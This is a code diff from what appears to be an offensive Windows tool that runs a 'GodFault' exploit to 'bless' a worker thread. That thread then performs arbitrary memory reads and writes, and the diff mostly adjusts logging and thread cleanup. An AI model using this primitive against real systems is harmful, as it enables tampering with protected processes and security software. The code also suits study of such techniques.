@@ -77,8 +77,6 @@ DWORD WINAPI BlessedThread(LPVOID lpParam)
 
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
 
-    _tprintf_or_not(TEXT("Worker thread started with TID: %u\n"), GetCurrentThreadId());
-
     while (TRUE)
     {
         WaitForSingleObject(gWorkerThreadInfo.hWorkerThreadSignal, INFINITE);
@@ -92,7 +90,6 @@ DWORD WINAPI BlessedThread(LPVOID lpParam)
             }
             else if (WorkerThreadOperation_Read == gWorkerThreadInfo.op)
             {
-                //if (!ReadProcessMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned))
                 ntStatus = NtReadVirtualMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned);
                 if (!NT_SUCCESS(ntStatus))
                 {
@@ -102,7 +99,6 @@ DWORD WINAPI BlessedThread(LPVOID lpParam)
             }
             else if (WorkerThreadOperation_Write == gWorkerThreadInfo.op)
             {
-                //if (!WriteProcessMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned))
                 ntStatus = NtWriteVirtualMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned);
                 if (!NT_SUCCESS(ntStatus))
                 {
@@ -134,10 +130,11 @@ HANDLE GetDriverHandle_GodFault()
     gWorkerThreadInfo.hWorkerThread = CreateThread(NULL, 0, BlessedThread, NULL, 0, NULL);
     Sleep(500);
 
-    // Launch GodFault to bless the thread
-    
+    // Launch GodFault to bless the thread    
     startInfo.cb = sizeof(startInfo);
     _snwprintf(commandLine, _countof(commandLine), L"GodFault.exe -t %u", GetThreadId(gWorkerThreadInfo.hWorkerThread));
+
+    _tprintf_or_not(TEXT("[+] Running command: %ws\n"), commandLine);
 
     if (!CreateProcessW(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &procInfo))
     {
@@ -158,7 +155,8 @@ HANDLE GetDriverHandle_GodFault()
 
 VOID CloseDriverHandle_GodFault()
 {
-    //TerminateThread(gWorkerThreadInfo.hWorkerThread, 0);
+    TerminateThread(gWorkerThreadInfo.hWorkerThread, 0);
+    gWorkerThreadInfo.hWorkerThread = NULL;
 }
 
 VOID ReadMemoryPrimitive_GodFault(SIZE_T Size, DWORD64 Address, PVOID Buffer) 
